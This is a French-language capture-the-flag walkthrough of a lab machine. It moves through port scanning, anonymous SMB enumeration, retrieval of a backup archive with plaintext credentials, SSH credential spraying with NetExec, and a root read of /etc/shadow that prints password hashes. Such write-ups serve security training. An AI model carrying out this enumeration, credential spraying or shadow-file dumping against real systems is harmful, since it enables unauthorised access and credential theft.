1.  <ins>Énumération</ins>

**<span style="color: #dddddd;">👁️</span> Nmap & Masscan**

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $sudo sh massap.sh
[sudo] Mot de passe de parrot : 
Entrer une IP: 192.168.56.52
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-16 21:28:34 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 22:31 CET           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:31
Completed NSE at 22:31, 10.02s elapsed
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
Initiating ARP Ping Scan at 22:31
Scanning 192.168.56.52 [1 port]
Completed ARP Ping Scan at 22:31, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:31
Completed Parallel DNS resolution of 1 host. at 22:31, 0.00s elapsed
Initiating SYN Stealth Scan at 22:31
Scanning 192.168.56.52 [5 ports]
Discovered open port 21/tcp on 192.168.56.52
Discovered open port 80/tcp on 192.168.56.52
Discovered open port 22/tcp on 192.168.56.52
Discovered open port 445/tcp on 192.168.56.52
Discovered open port 139/tcp on 192.168.56.52
Completed SYN Stealth Scan at 22:31, 0.01s elapsed (5 total ports)
Initiating Service scan at 22:31
Scanning 5 services on 192.168.56.52
```

&nbsp;

**🐧 Enum4linux**
&nbsp;
Users
```
┌─[parrot@parrot]─[~]
└──╼ $enum4linux 192.168.56.52

 ==================( Users on 192.168.56.52 via RID cycling (RIDS: 500-550,1000-1050) )==================

S-1-22-1-1000 Unix User\kbadmin (Local User)
```

&nbsp;

**🖥️ NetExec**

```
┌──[parrot@parrot]─[~/Desktop]
└──╼ $nxc smb 192.168.56.52 -u '' -p '' --shares
SMB         192.168.56.52   445    UBUNTU           [*] Unix - Samba (name:UBUNTU) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.56.52   445    UBUNTU           [+] \: (Guest)
SMB         192.168.56.52   445    UBUNTU           [*] Enumerated shares
SMB         192.168.56.52   445    UBUNTU           Share           Permissions     Remark
SMB         192.168.56.52   445    UBUNTU           -----           -----------     ------
SMB         192.168.56.52   445    UBUNTU           Anonymous       READ            OPEN YOUR EYES!
SMB         192.168.56.52   445    UBUNTU           IPC$                            IPC Service (Samba Server 4.7.6-Ubuntu)

```

&nbsp;

Avec le module `spider_plus` on va pouvoir voir si 1 fichier est présent

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $nxc smb 192.168.56.52 -u '' -p '' -M spider_plus
SMB         192.168.56.52   445    UBUNTU           [*] Unix - Samba (name:UBUNTU) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.56.52   445    UBUNTU           [+] \: (Guest)
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         192.168.56.52   445    UBUNTU           [*] Enumerated shares
SMB         192.168.56.52   445    UBUNTU           Share           Permissions     Remark
SMB         192.168.56.52   445    UBUNTU           -----           -----------     ------
SMB         192.168.56.52   445    UBUNTU           Anonymous       READ            OPEN YOUR EYES!
SMB         192.168.56.52   445    UBUNTU           IPC$                            IPC Service (Samba Server 4.7.6-Ubuntu)
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/192.168.56.52.json".
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] SMB Shares:           2 (Anonymous, IPC$)
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] SMB Readable Shares:  1 (Anonymous)
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] Total folders found:  0
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] Total files found:    1
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] File size average:    15.96 MB
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] File size min:        15.96 MB
SPIDER_PLUS 192.168.56.52   445    UBUNTU           [*] File size max:        15.96 MB
```

&nbsp;

Allons avoir ce que `netexec` a trouver comme fichier sur le partage

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $cat /tmp/nxc_hosted/nxc_spider_plus/192.168.56.52.json
{
    "Anonymous": {
        "backup.zip": {
            "atime_epoch": "2020-09-17 13:02:14",
            "ctime_epoch": "2020-09-17 12:58:56",
            "mtime_epoch": "2020-09-17 12:58:56",
            "size": "15.96 MB"
        }
    }

```

&nbsp;

**🖧 SMBclient**

Pour récupérer le fichier `backup.zip` on se connecte au partage `Anonymous` sans mot de passe

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $smbclient //192.168.56.52/Anonymous                   
Password for [WORKGROUP\parrot]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 17 12:58:56 2020
  ..                                  D        0  Wed Sep 16 12:36:09 2020
  backup.zip                          N 16735117  Thu Sep 17 12:58:56 2020

        14380040 blocks of size 1024. 8812284 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 16735117 as backup.zip (88820,0 KiloBytes/sec) (average 88820,0 KiloBytes/sec)
smb: \> 
```

&nbsp;

Unzip le fichier

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $unzip backup.zip 
Archive:  backup.zip
   creating: wordpress/
```

&nbsp;

Cred trouver dans le fichier `remember_me.txt`

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $cat remember_me.txt 
Username:admin
Password:MachineBoy141
```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test en `SSH` des 2 utilisateurs avec le mot de passe trouver

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $nxc ssh 192.168.56.52 -u wordlist-u.txt -p MachineBoy141 --sudo-check
SSH         192.168.56.52   22     192.168.56.52    [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
SSH         192.168.56.52   22     192.168.56.52    [+] kbadmin:MachineBoy141 (Pwn3d!) Linux - Shell access!

```

&nbsp;

Dump du fichier `shadow` contenant les hash des utilisateurs

```
root@kb-server:~# cat /etc/shadow
root:$6$YZDsk14E$fh2dTUL7/MoA3.i..iLirkpRCrdDFCn4brGZZPBc/KAmKAi7PI/u0eYuUJyPkhQnQbBYjhNQHODb1SfVN3M5u0:18521:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18521:0:99999:7:::
kbadmin:$6$SPJfrUH87ROVsFc8$M5wZ7UpMvIETR4a53PJhtQjjTi7/kN5tHPeDTzBFipEbW1AdXb0EgVcJPjZgkgcvNZntXefw4C/k.xVtsFui4/:18521:0:99999:7:::
mysql:!:18521:0:99999:7:::
ftp:*:18521:0:99999:7:::
```

&nbsp;

Cred trouver

| User | Password |
| --- | --- |
| kbadmin | MachineBoy141 |
